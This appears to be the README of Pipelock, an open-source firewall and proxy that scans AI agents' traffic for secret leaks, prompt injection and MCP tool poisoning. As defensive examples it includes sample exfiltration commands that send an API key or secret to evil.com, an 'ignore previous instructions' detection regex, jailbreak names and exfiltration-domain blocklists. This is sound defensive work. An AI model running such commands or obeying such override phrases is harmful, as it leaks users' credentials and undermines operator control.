<p align="center">
  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
</p>

# Pipelock

[![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
[![Go Report Card](https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock)](https://goreportcard.com/report/github.com/luckyPipewrench/pipelock)
[![GitHub Release](https://img.shields.io/github/v/release/luckyPipewrench/pipelock)](https://github.com/luckyPipewrench/pipelock/releases)
[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge)](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11948/badge?level=silver)](https://www.bestpractices.dev/projects/11948)
[![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

**Open-source [agent firewall](https://pipelab.org/agent-firewall/) for AI agents.** Single binary, zero runtime dependencies.

Your agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over — unless pipelock is watching
```

**Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor

[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)

![Pipelock demo — DLP blocking, domain blocklist, integrity monitoring](assets/demo.gif)

## Quick Start

```bash
# macOS / Linux
brew install luckyPipewrench/tap/pipelock

# Or download a binary (no dependencies)
# See https://github.com/luckyPipewrench/pipelock/releases

# Or with Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest

# Or from source (requires Go 1.24+)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
```

**Try the forward proxy (zero code changes):**

```bash
# 1. Generate a config and enable the forward proxy
pipelock audit . -o pipelock.yaml
pipelock generate config --preset balanced > pipelock.yaml

# 2. Start pipelock
pipelock run --config pipelock.yaml

# 3. Point any agent (or any process) at pipelock
export HTTPS_PROXY=http://127.0.0.1:8888
export HTTP_PROXY=http://127.0.0.1:8888

# Now every HTTP request flows through pipelock's scanner.
# This should be blocked (DLP catches the fake API key):
curl "https://example.com/?key=sk-ant-api03-fake1234567890"
```

No SDK, no wrapper, no code changes. If the agent speaks HTTP, pipelock scans it.

<details>
<summary>Fetch proxy mode (for agents with a dedicated fetch tool)</summary>

```bash
# Scan your project and generate a tailored config
pipelock audit . -o pipelock.yaml

# Verify: both should be blocked (exit code 1 = working correctly)
pipelock check --config pipelock.yaml --url "https://pastebin.com/raw/abc123"
pipelock check --config pipelock.yaml --url "https://example.com/?t=sk-ant-api03-fake1234567890"

# Start the proxy (agents connect to localhost:8888/fetch?url=...)
pipelock run --config pipelock.yaml

# For full network isolation (agent can ONLY reach pipelock):
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

</details>

<details>
<summary>Verify release integrity (SLSA provenance + SBOM)</summary>

Every release includes SLSA build provenance and an SBOM (CycloneDX). Verify with the GitHub CLI:

```bash
# Verify a downloaded binary
gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench

# Verify the container image (substitute the release version)
gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
```

</details>

## How It Works

Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): like a WAF for web apps, it sits inline between your AI agent and the internet. It uses **capability separation** -- the agent process (which has secrets) is network-restricted, while Pipelock (which has NO secrets) inspects all traffic through a 9-layer scanner pipeline.

Two proxy modes, same port:

- **Fetch proxy** (`/fetch?url=...`): Pipelock fetches the URL, extracts text, scans the response for prompt injection, and returns clean content. Best for agents that use a dedicated fetch tool.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling and absolute-URI forwarding. Agents use Pipelock as their system proxy with zero code changes. Hostname scanning catches blocked domains and SSRF before the tunnel opens. Best for agents that use native `fetch()` or HTTP libraries.

```mermaid
flowchart LR
    subgraph PRIVILEGED["Privileged Zone"]
        Agent["AI Agent\n(has API keys)"]
    end
    subgraph FETCH["Firewall Zone"]
        Proxy["Pipelock\n(NO secrets)"]
        Scanner["Scanner Pipeline\nSSRF · Blocklist · Rate Limit\nDLP · Env Leak · Entropy · Length"]
    end
    subgraph NET["Internet"]
        Web["Web"]
    end

    Agent -- "fetch URL\nor CONNECT" --> Proxy
    Proxy --> Scanner
    Scanner -- "content or\ntunnel" --> Agent
    Scanner -- "request" --> Web
    Web -- "response" --> Scanner
    Scanner -- "clean content" --> Agent

    style PRIVILEGED fill:#fee,stroke:#c33
    style FETCH fill:#efe,stroke:#3a3
    style NET fill:#eef,stroke:#33c
```

<details>
<summary>Text diagram (for terminals / non-mermaid renderers)</summary>

```
┌──────────────────────┐         ┌───────────────────────┐
│  PRIVILEGED ZONE     │         │  FIREWALL ZONE        │
│                      │         │                       │
│  AI Agent            │  IPC    │  Pipelock             │
│  - Has API keys      │────────>│  - NO secrets         │
│  - Has credentials   │ fetch / │  - Full internet      │
│  - Restricted network│ CONNECT │  - Returns text       │
│                      │<────────│  - URL scanning       │
│  Can reach:          │ content │  - Audit logging      │
│  ✓ api.anthropic.com │         │                       │
│  ✓ discord.com       │         │  Can reach:           │
│  ✗ evil.com          │         │  ✓ Any URL            │
│  ✗ pastebin.com      │         │  But has:             │
└──────────────────────┘         │  ✗ No env secrets     │
                                 │  ✗ No credentials     │
                                 └───────────────────────┘
```

</details>

## Why Pipelock?

| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
|---|---|---|---|---|
| Secret exfiltration prevention | Yes | Partial (proxy mode) | Partial (domain-level) | Yes |
| DLP + entropy analysis | Yes | No | No | Partial |
| Prompt injection detection | Yes | Yes | No | No |
| Workspace integrity monitoring | Yes | No | No | Partial |
| MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
| MCP HTTP transport (Streamable HTTP + reverse proxy) | Yes | No | No | No |
| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel-level enforcement) |
| Audit logging + Prometheus | Yes | No | No | No |

Full comparison: [docs/comparison.md](docs/comparison.md)

## Security Matrix

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. Pipelock doesn't sandbox processes or restrict syscalls. It's a content inspection layer. For full defense in depth, pair it with an OS sandbox (see [docs/comparison.md](docs/comparison.md)).

## Features

### Project Audit

Scan any project directory to detect security risks and generate a tailored config:

```bash
pipelock audit ./my-project -o pipelock-suggested.yaml
```

Detects agent type (Claude Code, Cursor, CrewAI, LangGraph, AutoGen), programming languages, package ecosystems, MCP servers, and secrets in environment variables and config files. Outputs a security score and a suggested config file tuned for your project.

### URL Scanning

Every request passes through a 9-layer scanner pipeline:

1. **Scheme validation** — enforces http/https only
2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh). Pre-DNS.
3. **DLP patterns** — regex matching for API keys, tokens, and secrets. Includes env variable leak detection (values 16+ chars with entropy > 3.0, raw + base64/hex/base32 encoded) and known-secret file scanning (raw + encoded forms). Pre-DNS to prevent secret exfiltration via DNS queries.
4. **Path entropy analysis** — Shannon entropy flags encoded/encrypted data in URL path segments
5. **Subdomain entropy analysis** — flags high-entropy subdomains used for DNS exfiltration
6. **SSRF protection** — blocks internal/private IPs with DNS rebinding prevention. Post-DNS, safe after DLP.
7. **Rate limiting** — per-domain sliding window
8. **URL length limits** — unusually long URLs suggest data exfiltration
9. **Data budget** — per-domain byte limits prevent slow-drip exfiltration across many requests

### Response Scanning

Fetched content is scanned for prompt injection before reaching the agent:

- **Prompt injection** — "ignore previous instructions" and variants
- **System/role overrides** — attempts to hijack system prompts
- **Jailbreak attempts** — DAN mode, developer mode, etc.

Actions: `block` (reject entirely), `strip` (redact matched text), `warn` (log and pass through), `ask` (terminal y/N/s prompt with timeout — requires TTY)

### File Integrity Monitoring

```bash
pipelock integrity init ./workspace --exclude "logs/**"
pipelock integrity check ./workspace         # exit 0 = clean
pipelock integrity check ./workspace --json  # machine-readable
pipelock integrity update ./workspace        # re-hash after review
```

SHA256 manifests detect modified, added, or removed files. See [lateral movement in multi-agent systems](https://pipelab.org/blog/lateral-movement-multi-agent-llm/).

### Git Protection

```bash
git diff HEAD~1 | pipelock git scan-diff             # scan for secrets in unified diff
pipelock git install-hooks --config pipelock.yaml     # pre-push hook
```

Input must be unified diff format (with `+++ b/filename` headers and `+` lines). Plain text won't match.

### Ed25519 Signing

```bash
pipelock keygen my-bot                         # generate key pair
pipelock sign manifest.json --agent my-bot     # sign a file
pipelock verify manifest.json --agent my-bot   # verify signature
pipelock trust other-bot /path/to/other-bot.pub  # trust a peer
```

Keys stored under `~/.pipelock/agents/` and `~/.pipelock/trusted_keys/`.

### MCP Proxy + Bidirectional Scanning

Wrap any MCP server as a stdio proxy. Pipelock scans both directions: client requests are checked for DLP leaks and injection in tool arguments, server responses are scanned for prompt injection, and `tools/list` responses are checked for poisoned tool descriptions and rug-pull definition changes:

```bash
# Wrap a local MCP server (stdio transport)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Proxy a remote MCP server (Streamable HTTP transport)
pipelock mcp proxy --upstream http://localhost:8080/mcp

# HTTP reverse proxy (MCP-to-MCP, for server deployments)
pipelock mcp proxy --listen 0.0.0.0:8889 --upstream http://upstream:3000/mcp

# Combined mode (fetch/forward proxy + MCP listener on separate ports)
pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp

# Batch scan (stdin)
mcp-server | pipelock mcp scan
pipelock mcp scan --json --config pipelock.yaml < responses.jsonl
```

Catches injection split across content blocks. Exit 0 if clean, 1 if injection detected.

### MCP Tool Call Policy

Define rules to block or warn before specific tool calls reach MCP servers:

```yaml
mcp_tool_policy:
  enabled: true
  action: warn
  rules:
    - name: "Block shell execution"
      tool_pattern: "execute_command|run_terminal"
      action: block
    - name: "Warn on sensitive writes"
      tool_pattern: "write_file"
      arg_pattern: '/etc/.*|/usr/.*'
      action: warn
```

Auto-enabled in proxy mode. Rules are evaluated before tool calls are forwarded.

### Multi-Agent Support

Each agent identifies itself via `X-Pipelock-Agent` header (or `?agent=` query parameter). All audit logs include the agent name for per-agent filtering.

```bash
curl -H "X-Pipelock-Agent: my-bot" "http://localhost:8888/fetch?url=https://example.com"
```

## Configuration

```yaml
version: 1
mode: balanced
enforce: true              # set false for audit mode (log without blocking)

api_allowlist:
  - "*.anthropic.com"
  - "*.openai.com"
  - "*.discord.com"
  - "github.com"

fetch_proxy:
  listen: "127.0.0.1:8888"
  timeout_seconds: 30
  max_response_mb: 10
  user_agent: "Pipelock Fetch/1.0"
  monitoring:
    entropy_threshold: 4.5
    max_url_length: 2048
    max_requests_per_minute: 60
    blocklist:
      - "*.pastebin.com"
      - "*.transfer.sh"

dlp:
  scan_env: true
  secrets_file: "./known-secrets.txt"  # optional: one secret per line, scanned in raw + encoded forms
  patterns:
    - name: "Anthropic API Key"
      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}'
      severity: critical
    - name: "AWS Access Key"
      regex: 'AKIA[0-9A-Z]{16}'
      severity: critical
    # ... 13 more patterns ship by default (see configs/balanced.yaml)

response_scanning:
  enabled: true
  action: warn               # block, strip, warn, or ask (HITL)
  patterns:
    - name: "Prompt Injection"
      regex: '(?i)(ignore|disregard)\s+(all\s+)?(previous|prior)\s+(instructions|prompts)'

mcp_input_scanning:
  enabled: true
  action: warn               # block or warn (auto-enabled for mcp proxy)
  on_parse_error: block      # block or forward

mcp_tool_scanning:
  enabled: true
  action: warn               # block or warn (auto-enabled for mcp proxy)
  detect_drift: true         # alert on tool description changes mid-session

# mcp_tool_policy:           # pre-execution tool call policy (see "MCP Tool Call Policy" above)
#   enabled: true
#   action: warn
#   rules: []

forward_proxy:
  enabled: false             # enable to accept CONNECT tunnels and absolute-URI requests
  max_tunnel_seconds: 300    # max lifetime per tunnel
  idle_timeout_seconds: 120  # kill idle tunnels after this

logging:
  format: json
  output: stdout
  include_allowed: true
  include_blocked: true

internal:
  - "0.0.0.0/8"
  - "127.0.0.0/8"
  - "10.0.0.0/8"
  - "100.64.0.0/10"
  - "172.16.0.0/12"
  - "192.168.0.0/16"
  - "169.254.0.0/16"
  - "::1/128"
  - "fc00::/7"
  - "fe80::/10"

git_protection:
  enabled: false
  allowed_branches: ["feature/*", "fix/*", "main"]
  pre_push_scan: true
```

### Presets

| Preset | Mode | Action | Best For |
|--------|------|--------|----------|
| `configs/balanced.yaml` | balanced | warn | General purpose |
| `configs/strict.yaml` | strict | block | High-security environments |
| `configs/audit.yaml` | audit | warn | Log-only monitoring |
| `configs/claude-code.yaml` | balanced | block | Claude Code (unattended) |
| `configs/cursor.yaml` | balanced | block | Cursor IDE (unattended) |
| `configs/generic-agent.yaml` | balanced | warn | New agents (tuning phase) |

## Integration Guides

- **[Claude Code](docs/guides/claude-code.md)** — MCP proxy setup, `.claude.json` configuration, HTTP fetch proxy hooks
- **[OpenAI Agents SDK](docs/guides/openai-agents.md)** — `MCPServerStdio`, multi-agent handoffs, Docker Compose
- **[Google ADK](docs/guides/google-adk.md)** — `McpToolset`, `StdioConnectionParams`, sub-agents
- **[AutoGen](docs/guides/autogen.md)** — `StdioServerParams`, `mcp_server_tools()`, multi-agent teams
- **[CrewAI](docs/guides/crewai.md)** — `MCPServerStdio` wrapping, `MCPServerAdapter`, Docker Compose
- **[LangGraph](docs/guides/langgraph.md)** — `MultiServerMCPClient`, `StateGraph`, Docker deployment
- Cursor — use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)

## GitHub Action

Scan your project for agent security risks on every PR. No Go toolchain needed.

```yaml
# .github/workflows/pipelock.yaml
- uses: luckyPipewrench/pipelock@v0.2.7
  with:
    scan-diff: 'true'
    fail-on-findings: 'true'
```

The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce GitHub annotations inline on the PR diff.

**With a config file:**

```yaml
- uses: luckyPipewrench/pipelock@v0.2.7
  with:
    config: pipelock.yaml
    test-vectors: 'true'
```

See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow, or [`examples/ci-workflow-advanced.yaml`](examples/ci-workflow-advanced.yaml) for security score reporting in the job summary.

| Input | Default | Description |
|-------|---------|-------------|
| `version` | `latest` | Pipelock version to download |
| `config` | *(none)* | Path to config file (auto-generates if not set) |
| `directory` | `.` | Directory to scan |
| `scan-diff` | `true` | Scan PR diff for leaked secrets |
| `fail-on-findings` | `true` | Fail if critical findings detected |
| `test-vectors` | `true` | Validate scanning coverage with built-in tests |

## Docker

```bash
# Pull from GHCR
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888

# Build locally
docker build -t pipelock .
docker run -p 8888:8888 pipelock

# Network-isolated agent (Docker Compose)
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

The generated compose file creates two containers: **pipelock** (firewall with internet access) and **agent** (your AI agent on an internal-only network, can only reach pipelock).

<details>
<summary>API Reference</summary>

```bash
# Fetch a URL (returns extracted text content)
curl "http://localhost:8888/fetch?url=https://example.com"

# Forward proxy (when forward_proxy.enabled: true)
# Set HTTPS_PROXY=http://localhost:8888 and use any HTTP client normally.
# HTTPS goes through CONNECT tunnels; plain HTTP uses absolute-URI forwarding.
curl -x http://localhost:8888 https://example.com

# Health check
curl "http://localhost:8888/health"

# Prometheus metrics
curl "http://localhost:8888/metrics"

# JSON stats (top blocked domains, scanner hits, tunnels, block rate)
curl "http://localhost:8888/stats"
```

**Fetch response:**
```json
{
  "url": "https://example.com",
  "agent": "my-bot",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "This domain is for use in illustrative examples...",
  "blocked": false
}
```

**Health response:**
```json
{
  "status": "healthy",
  "version": "x.y.z",
  "mode": "balanced",
  "uptime_seconds": 3600.5,
  "dlp_patterns": 15,
  "response_scan_enabled": true,
  "git_protection_enabled": false,
  "rate_limit_enabled": true,
  "forward_proxy_enabled": false
}
```

**Stats response:**
```json
{
  "uptime_seconds": 3600.5,
  "requests": {
    "total": 150,
    "allowed": 142,
    "blocked": 8,
    "block_rate": 0.053
  },
  "tunnels": 42,
  "top_blocked_domains": [
    {"name": "pastebin.com", "count": 5},
    {"name": "transfer.sh", "count": 3}
  ],
  "top_scanners": [
    {"name": "blocklist", "count": 5},
    {"name": "dlp", "count": 3}
  ]
}
```

</details>

<details>
<summary>OWASP Agentic Top 10 Coverage</summary>

| Threat | Coverage |
|--------|----------|
| ASI01 Agent Goal Hijack | **Strong** - bidirectional MCP + response scanning |
| ASI02 Tool Misuse | **Partial** - proxy as controlled tool, MCP scanning |
| ASI03 Identity & Privilege Abuse | **Strong** - capability separation + SSRF protection |
| ASI04 Supply Chain Vulnerabilities | **Partial** - integrity monitoring + MCP scanning |
| ASI05 Unexpected Code Execution | **Moderate** - HITL approval, fail-closed defaults |
| ASI06 Memory & Context Poisoning | **Moderate** - injection detection on fetched content |
| ASI07 Insecure Inter-Agent Communication | **Partial** - agent ID, integrity, signing |
| ASI08 Cascading Failures | **Moderate** - fail-closed architecture, rate limiting |
| ASI09 Human-Agent Trust Exploitation | **Partial** - HITL modes, audit logging |
| ASI10 Rogue Agents | **Strong** - domain allowlist + rate limiting + capability separation |

Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)

</details>

```text
cmd/pipelock/          CLI entry point
internal/
  cli/                 Cobra commands (run, check, generate, logs, git, integrity, mcp,
                         keygen, sign, verify, trust, version, healthcheck)
  config/              YAML config loading, validation, defaults, hot-reload (fsnotify)
  scanner/             URL scanning (SSRF, blocklist, rate limit, DLP, entropy, env leak)
  audit/               Structured JSON audit logging (zerolog)
  proxy/               HTTP proxy: fetch (/fetch), forward (CONNECT + absolute-URI), DNS pinning
  metrics/             Prometheus metrics + JSON stats endpoint
  gitprotect/          Git-aware security (diff scanning, branch validation, hooks)
  integrity/           File integrity monitoring (SHA256 manifests, check/diff, exclusions)
  signing/             Ed25519 key management, file signing, signature verification
  mcp/                 MCP proxy (stdio + Streamable HTTP) + bidirectional scanning + tool poisoning
  hitl/                Human-in-the-loop terminal approval (ask action)
configs/               Preset config files (strict, balanced, audit, claude-code, cursor, generic-agent)
docs/                  OWASP mapping, tool comparison
blog/                  Blog posts (mirrored at pipelab.org/blog/)
```

## Testing

Canonical metrics — updated each release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | 2,700+ |
| Statement coverage | 96%+ |
| Evasion techniques tested | 230+ |
| Scanner pipeline overhead | ~25μs per URL scan |
| CI matrix | Go 1.24 + 1.25, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
| OpenSSF Scorecard | 8.0/10 |

Run `make test` to verify locally. Full benchmark details: [docs/benchmarks.md](docs/benchmarks.md).

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to [Snyk agent-scan](https://github.com/snyk/agent-scan), [Docker MCP Gateway](https://github.com/docker/mcp-gateway), [AIP](https://github.com/ArangoGutierrez/agent-identity-protocol), [agentsh](https://github.com/canyonroad/agentsh), and [srt](https://github.com/anthropic-experimental/sandbox-runtime)
- Security review contributions from Dylan Corrales

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.

## License

Apache License 2.0. Copyright 2026 Joshua Waldrep.

See [LICENSE](LICENSE) for the full text.
